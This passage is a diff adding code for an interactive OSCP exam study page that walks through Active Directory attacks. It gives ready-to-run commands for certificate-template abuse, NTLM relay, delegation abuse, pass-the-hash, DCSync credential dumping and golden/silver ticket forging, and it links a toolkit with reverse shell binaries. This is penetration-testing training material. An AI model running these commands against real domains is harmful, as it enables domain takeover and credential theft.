+<span class="cm"># ESC1: Request cert as Domain Admin:</span>
+<span class="ct">${T.cert}-ad req</span> -u &lt;user&gt;@$DOM -p '&lt;pass&gt;' -ca &lt;CA_NAME&gt; -template &lt;VULN_TEMPLATE&gt; -upn administrator@$DOM
+
+<span class="cm"># Authenticate with certificate:</span>
+<span class="ct">${T.cert}-ad auth</span> -pfx administrator.pfx -dc-ip $DC_IP</div>
+<h4>ESC4 (Modify Template ACL)</h4>
+<div class="cb"><span class="cm"># If you have WriteProperty/WriteDACL on a template:</span>
+<span class="ct">${T.cert}-ad template</span> -u &lt;user&gt;@$DOM -p '&lt;pass&gt;' -template &lt;TEMPLATE&gt; -save-old
+<span class="cm"># Modify template to allow ESC1 enrollment, then request cert as above</span>
+<span class="cm"># Restore after: certipy-ad template -u ... -template ... -configuration old-config.json</span></div>
+<h4>ESC8 (Web Enrollment NTLM Relay)</h4>
+<div class="cb"><span class="cm"># If ADCS web enrollment is running (http://&lt;CA&gt;/certsrv/):</span>
+<span class="ct">impacket-ntlmrelayx</span> -t http://&lt;CA_IP&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+<span class="cm"># Coerce auth from DC: PetitPotam, PrinterBug, etc.</span></div>`},
+
+{step:"04",title:"RBCD & Constrained Delegation",body:`<h4>Resource-Based Constrained Delegation (RBCD)</h4>
+<div class="cb"><span class="cm"># If you have GenericAll/GenericWrite on a computer object:</span>
+<span class="ct">impacket-addcomputer</span> $DOM/$USER:"$PASS" -computer-name FAKE$ -computer-pass Password123!
+<span class="ct">rbcd.py</span> -delegate-from FAKE$ -delegate-to &lt;TARGET&gt;$ -action write $DOM/$USER:"$PASS" -dc-ip $DC_IP
+<span class="ct">impacket-getST</span> -spn cifs/&lt;TARGET&gt;.$DOM -impersonate Administrator $DOM/FAKE$:Password123! -dc-ip $DC_IP
+export KRB5CCNAME=Administrator@cifs_&lt;TARGET&gt;.$DOM@$DOM.ccache
+<span class="ct">impacket-psexec</span> -k -no-pass &lt;TARGET&gt;.$DOM</div>
+<h4>Constrained Delegation</h4>
+<div class="cb"><span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" --trusted-for-delegation
+<span class="cm"># Abuse with S4U ticket impersonation via ${T.rub} or impacket-getST</span></div>`},
+
+{step:"05",title:"Take the Domain Controller",body:`<h4>With Domain Admin Creds (PsExec / Alternatives)</h4>
+<div class="cb"><span class="ct">impacket-psexec</span> $DOM/administrator:'&lt;pass&gt;'@$DC_IP
+<span class="cm"># Or pass-the-hash:</span>
+<span class="ct">impacket-psexec</span> -hashes :&lt;NTLM&gt; $DOM/administrator@$DC_IP
+
+<span class="cm"># If PsExec fails (AV blocks named pipe or service creation):</span>
+<span class="ct">impacket-smbexec</span> $DOM/administrator:'&lt;pass&gt;'@$DC_IP
+<span class="ct">impacket-wmiexec</span> $DOM/administrator:'&lt;pass&gt;'@$DC_IP
+<span class="ct">impacket-atexec</span> $DOM/administrator:'&lt;pass&gt;'@$DC_IP 'whoami'
+<span class="ct">evil-winrm</span> -i $DC_IP -u administrator -p '&lt;pass&gt;'</div>
+<h4>Pass-the-Ticket (PTT) with .ccache</h4>
+<div class="cb"><span class="cm"># Use Kerberos ticket from impacket-getST or impacket-getTGT:</span>
+export KRB5CCNAME=Administrator.ccache
+<span class="ct">impacket-psexec</span> -k -no-pass $DC.$DOM
+<span class="ct">impacket-wmiexec</span> -k -no-pass $DC.$DOM
+<span class="ct">impacket-smbexec</span> -k -no-pass $DC.$DOM</div>
+<h4>DCSync (Dump All Domain Hashes)</h4>
+<div class="cb"><span class="ct">impacket-secretsdump</span> -just-dc $DOM/&lt;admin&gt;:'&lt;pass&gt;'@$DC_IP</div>
+<h4>WriteDACL &rarr; Domain Admins &rarr; DCSync</h4>
+<div class="cb"><span class="cm"># After WriteDACL abuse:</span>
+<span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" add groupMember "Domain Admins" $USER
+
+<span class="cm"># Get Kerberos ticket:</span>
+<span class="ct">impacket-getTGT</span> $DOM/$USER:"$PASS" -dc-ip $DC_IP
+export KRB5CCNAME=$USER.ccache
+
+<span class="cm"># DCSync:</span>
+<span class="ct">impacket-secretsdump</span> -just-dc -k -no-pass $DOM/$USER@$DC</div>
+<h4>Golden / Silver Tickets</h4>
+<div class="cb"><span class="cm"># Golden Ticket (need krbtgt hash from DCSync):</span>
+<span class="ct">impacket-ticketer</span> -nthash &lt;krbtgt_NTLM&gt; -domain-sid &lt;SID&gt; -domain $DOM Administrator
+export KRB5CCNAME=Administrator.ccache
+<span class="ct">impacket-psexec</span> -k -no-pass $DC.$DOM
+
+<span class="cm"># Silver Ticket (service-specific, e.g. MSSQL):</span>
+<span class="ct">impacket-ticketer</span> -nthash &lt;service_NTLM&gt; -domain-sid &lt;SID&gt; -domain $DOM -spn MSSQLSvc/$DC.$DOM:1433 Administrator</div>
+<div class="wb"><strong>DC01 = 20 points. Screenshot proof.txt with <code>whoami && hostname && ipconfig</code> visible. The screenshot is required for the report.</strong></div>
+<div class="cb"><span class="ct">type</span> C:\\Users\\Administrator\\Desktop\\proof.txt</div>`}
+]}
+
+};}
+
+const M=bM();
+let hist=[];
+let cur="root";
+
+function render(){
+  const a=document.getElementById("app"),b=document.getElementById("bc");
+  if(M[cur]){renderM(a,b);return;}
+  const n=TREE[cur];
+  if(!n)return;
+  b.innerHTML=mkBC();
+  let h="";
+  if(cur==="root"){
+    h+=`<div class="ms open" style="margin-bottom:1.5rem">
+      <div class="mh" onclick="tog(this)"><span class="sn">00</span><h3>Step 0 &mdash; Download the OSCP Toolkit</h3><span class="tg">&#9660;</span></div>
+      <div class="mb">
+        <p>Before you start, clone the <strong>OSCPToolkit</strong> to your Kali machine. It contains all the scripts, binaries, and wordlists referenced throughout this decision tree.</p>
+        <div class="cb"><span class="ct">git clone</span> <span class="cv">https://github.com/struttonpigeon/OSCPToolkit.git</span> ~/oscp-toolkit
+cd ~/oscp-toolkit && ls</div>
+        <p>The toolkit includes:</p>
+        <ul>
+          <li>Windows &amp; Linux privilege escalation scripts (WinPEAS, LinPEAS, PowerUp, PrivescCheck, pspy)</li>
+          <li>AD attack tools (${T.shh}, ${T.rub}, ${T.pv}, ${T.kb})</li>
+          <li>Pivoting agents (Ligolo-ng, Chisel)</li>
+          <li>Reverse shell binaries (nc, socat, ncat)</li>
+          <li>Credential tools (${T.mk}, ${T.lz}, RunasCs, GodPotato, PrintSpoofer)</li>
+          <li>Windows-exploit-suggester standalone script</li>
+          <li>Penelope reverse shell handler (OSCP safe mode)</li>
+        </ul>
+        <div class="tb"><strong>Tip:</strong> Host the toolkit folder with <code>python3 -m http.server 8000</code> from Kali so you can quickly transfer files to targets during the exam.</div>
+        <h4>${T.bh} CE Setup (Do This Before the Exam)</h4>
+        <p>${T.bh} CE runs in Docker. Install and verify it works <strong>before</strong> exam day so you're not debugging Docker mid-exam.</p>
+        <div class="cb"><span class="cm"># Install ${T.bh} CE (one-time)</span>
+curl -L https://ghst.ly/getbhce | docker compose -f - up
+<span class="cm"># Note the initial admin password from docker logs</span>
+
+<span class="cm"># After install, stop it:</span>
+cd ~/bloodhound-ce && docker compose down
+
+<span class="cm"># On exam day, start it:</span>
+cd ~/bloodhound-ce && docker compose up -d
+<span class="cm"># Access: http://localhost:8080  (admin / your-password)</span></div>
+        <h4>Collecting ${T.bh} Data</h4>
+        <div class="cb"><span class="cm"># From Kali with domain creds (through Ligolo pivot if needed):</span>
+<span class="ct">bloodhound-ce-python</span> --zip -c All -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -dc &lt;DC_HOSTNAME&gt; -ns &lt;DC_IP&gt;
+
+<span class="cm"># Upload the .zip to ${T.bh} CE web UI</span></div>
+        <h4>What to Check in ${T.bh}</h4>
+        <ul>
+          <li>Mark your owned users and computers as "Owned"</li>
+          <li><strong>Shortest Path to Domain Admin</strong> &mdash; this is your attack plan</li>
+          <li>Kerberoastable accounts (crackable service account passwords)</li>
+          <li>AS-REP roastable accounts (no pre-auth required)</li>
+          <li>ACL abuse paths: GenericAll, WriteDACL, ForceChangePassword, WriteOwner, AddMember</li>
+          <li>Accounts with "svc" in the name (service accounts often have weak passwords)</li>
+          <li>Users with admin rights on other machines (lateral movement paths)</li>
+          <li>Group memberships that chain to Domain Admins</li>
+        </ul>
+        <div class="wb"><strong>Important:</strong> ${T.bh} shows you the path. You still need to execute each step manually. Run it as soon as you have domain credentials &mdash; don't wait until you're stuck.</div>
+      </div>
+    </div>`;
+  }
+  h+=`<div class="pl">${n.phase}</div><div class="ds">`;
+  for(const c of n.choices)
+    h+=`<div class="dc" onclick="nav('${c.id}')"><div class="ic ${c.color}">${c.icon}</div><div class="nfo"><h3>${c.label}</h3><p>${c.desc}</p></div><div class="ar">&#8250;</div></div>`;
+  h+="</div>";a.innerHTML=h;
+}
+
+function renderM(a,b){
+  const m=M[cur];
+  b.innerHTML=mkBC();
+  let h=`<button class="bb" onclick="goBack()">&#8249; Back</button><div class="pl">${m.title}</div><div class="mt">`;
+  for(const s of m.sections)
+    h+=`<div class="ms"><div class="mh" onclick="tog(this)"><span class="sn">${s.step}</span><h3>${s.title}</h3><span class="tg">&#9660;</span></div><div class="mb">${s.body}</div></div>`;
+  h+="</div>";a.innerHTML=h;
+  const f=a.querySelector(".ms");if(f)f.classList.add("open");
+  a.querySelectorAll(".cb").forEach(bl=>{
+    const btn=document.createElement("button");btn.className="cp";btn.textContent="copy";
+    btn.onclick=function(e){e.stopPropagation();
+      const t=bl.textContent.replace(/copy$/,"").trim();
+      try{navigator.clipboard.writeText(t).then(()=>{btn.textContent="copied";setTimeout(()=>btn.textContent="copy",1500)}).catch(()=>{});}catch(er){}
+    };bl.appendChild(btn);
+  });
+}
+
+function mkBC(){
+  const L={root:"Start",standalone:"Standalone",ad:"AD Set",win:"Windows",linux:"Linux",
+    win_noaccess:"No Access",win_lowpriv:"Low Priv",win_admin:"Admin",
+    linux_noaccess:"No Access",linux_lowpriv:"Low Priv",linux_root:"Root",
+    ad_initial:"Initial",ad_ms01_lowpriv:"MS01 Low",ad_ms01_admin:"MS01 Admin",ad_ms02:"MS02\u2192DC"};
+  let c="";
+  for(let i=0;i<hist.length;i++)
+    c+=`<span class="cr" onclick="jumpTo(${i})">${L[hist[i]]||hist[i]}</span><span class="sp">&#8250;</span>`;
+  c+=`<span class="cr cur">${L[cur]||cur}</span>`;return c;
+}
+
+function nav(id){const a=document.getElementById("app");a.classList.add("fo");setTimeout(()=>{hist.push(cur);cur=id;render();a.classList.remove("fo");window.scrollTo({top:0,behavior:"smooth"});},120);}
+function goBack(){if(!hist.length)return;const a=document.getElementById("app");a.classList.add("fo");setTimeout(()=>{cur=hist.pop();render();a.classList.remove("fo");},120);}
+function jumpTo(i){const a=document.getElementById("app");a.classList.add("fo");setTimeout(()=>{cur=hist[i];hist=hist.slice(0,i);render();a.classList.remove("fo");},120);}
+function tog(h){h.parentElement.classList.toggle("open");}
+
+render();
+</script>
